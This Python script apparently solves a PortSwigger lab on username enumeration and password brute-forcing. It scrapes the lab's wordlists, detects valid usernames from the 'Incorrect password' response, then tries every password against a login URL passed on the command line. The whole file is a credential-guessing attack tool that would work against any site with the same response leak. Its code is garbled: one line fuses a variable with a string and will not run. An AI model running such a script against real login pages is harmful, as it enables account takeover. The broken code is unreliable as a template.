import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {'http':'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def scrap_username():
    url = "https://portswigger.net/web-security/authentication/auth-lab-usernames"
    r = requests.get(url, verify=False, proxies=proxy)
    res = r.text
    soup = BeautifulSoup(res, 'html.parser')
    for word in soup.code.contents:
        word = word.split('\n')
        username_list = word
    return username_list

def scrap_password():
    url = 'https://portswigger.net/web-security/authentication/auth-lab-passwords'
    r = requests.get(url, verify=False, proxies=proxy)
    res = r.text
    soup = BeautifulSoup (res, 'html.parser')
    for word in soup.code.contents:
        word = word.split('\n')
        password_list = word
    return password_list


def enum_username(url):
    username_list= scrap_username()
    print("[+] Looking for valid username")
    for i in username_list:
        creds = {
        'username': i,
        'password': 'lol'
        }
        r = requests.post(url, verify= False, proxies=proxy, data=creds)
        res = r.text
        if 'Incorrect password' in res:
            print(i)
            valid_username= []
            valid_username.append(i)
            return valid_username

def cred_steal(url):
    password_list = scrap_password()
    valid_username = enum_username(url)
    print("[+] Looking for valid password")
    for i in valid_username:
        for j in password_list:
            creds = {
                'username': i,
                'password': jIncorrect password'
            }
            r = requests.post(url, verify=False, proxies=proxy, data=creds)
            res = r.text
            if 'Incorrect password' not in res:
                print("[+] Valid username %s" % i)
                print("[+] Valid password %s " % j)



def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url> " % sys.argv[0])
        print("[+] Example: %s www.example.com " % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1].strip()
    print("[+] Brute forcing the shit out of the website...")
    cred_steal(url)


if __name__=="__main__":
    main()